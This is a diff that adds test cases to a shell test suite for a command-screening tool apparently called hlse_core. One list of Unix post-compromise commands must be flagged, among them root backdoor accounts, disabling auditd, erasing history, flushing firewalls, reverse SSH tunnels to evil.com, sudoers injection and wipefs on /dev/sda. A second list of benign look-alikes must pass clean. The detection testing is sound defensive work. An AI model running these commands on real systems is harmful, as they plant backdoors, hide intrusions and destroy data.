@@ -11671,6 +11671,90 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-228: Unix post-compromise primitives ──────────────
+for c in \
+    'useradd -ou 0 -g 0 evil' \
+    'useradd -o -u 0 backdoor' \
+    'adduser --uid 0 x' \
+    'usermod -aG sudo x' \
+    'usermod -aG wheel x' \
+    'setenforce 0' \
+    'auditctl -D' \
+    'systemctl stop auditd' \
+    'systemctl disable auditd' \
+    'service auditd stop' \
+    'killall auditd' \
+    'pkill auditd' \
+    'history -c' \
+    'unset HISTFILE' \
+    'export HISTFILE=/dev/null' \
+    'rm ~/.bash_history' \
+    'ln -sf /dev/null .bash_history' \
+    'truncate -s0 .bash_history' \
+    'iptables -F' \
+    'iptables -X' \
+    'iptables --flush' \
+    'ip6tables -F' \
+    'nft flush ruleset' \
+    'ufw disable' \
+    'pfctl -d' \
+    'firewall-cmd --permanent --add-port=4444' \
+    'firewall-cmd --panic-on' \
+    'ssh -R 4444:localhost:22 user@evil.com' \
+    'ssh -D 9050 user@evil.com' \
+    'ssh -Nf -R 2222 x' \
+    'autossh -M 0 -R 2222 x' \
+    'echo "evil ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' \
+    'echo x | tee /etc/sudoers' \
+    'systemd-run --scope curl e.sh' \
+    'systemd-run --user x' \
+    'systemd-run -t bash' \
+    'systemd-run -- cat x' \
+    'nsenter -t 1 -m bash' \
+    'unshare -u bash' \
+    'unshare --user bash' \
+    'docker run -v /:/host alpine' \
+    'docker run --privileged x' \
+    'docker run --net=host x' \
+    'xxd -r x|bash' \
+    'chattr -i /tmp/x' \
+    'chattr +i /var/log/x' \
+    'wipefs -a /dev/sda' \
+    'wipefs /dev/sda' \
+    'find / -perm -4000' \
+    'getcap -r / 2>/dev/null' \
+    'gdb -p 1 -ex' \
+    'strace -p 1' \
+    'ltrace -p 1' \
+    'openssl s_client -connect evil:443' \
+    'openssl enc -d -a -in x' \
+    'awk "BEGIN{system(\"x\")}"' \
+    'xclip -o -selection clipboard'; do
+    ./hlse_core paste "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "paste: $c flagged" "0" "0" \
+        || check "paste: $c flagged" "0" "1"
+done
+for c in 'useradd -m newuser' 'useradd -u 1001 x' 'usermod -aG docker x' \
+         'sestatus' 'getenforce' 'setenforce 1' 'auditctl -l' \
+         'auditctl -a always,exit' 'systemctl status auditd' \
+         'systemctl start auditd' 'history' 'history 5' 'echo HISTFILE' \
+         'cat .bash_history' 'iptables -L' \
+         'iptables -A INPUT -p tcp --dport 22 -j ACCEPT' \
+         'nft list ruleset' 'ufw status' 'pfctl -sr' \
+         'firewall-cmd --list-all' 'ssh user@host' 'ssh -l root host' \
+         'ssh -i key.pem x' 'ssh -p 2222 x' 'visudo' 'cat /etc/sudoers' \
+         'systemd-run --help' 'nsenter --help' 'unshare --help' \
+         'docker run x' 'docker run -v /etc:/etc x' 'xxd x' \
+         'chattr +a /var/log/x' 'lsattr x' 'wipefs --help' \
+         'find . -name x' 'find . -perm /u+w' 'getcap x' 'gdb x' \
+         'gdb --batch -ex' 'strace ls' 'openssl version' \
+         'openssl enc -a -in x' 'awk "{print \$1}" x' 'xclip -i' \
+         'sftp user@host' 'scp file x@y:'; do
+    ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
+        && check "paste FP guard: $c clean" "0" "0" \
+        || check "paste FP guard: $c clean" "0" "1"
+done
+
 # ── cycle-227: installer carriers + IDE/Shortcuts schemes + scam vocab ─
 for f in 'x.apk' 'x.aab' 'x.ipa' 'x.deb' 'x.rpm' 'x.AppImage' \
          'x.vsix' 'x.crx' 'x.xpi' 'x.oex' 'x.xap' 'x.clickonce' \
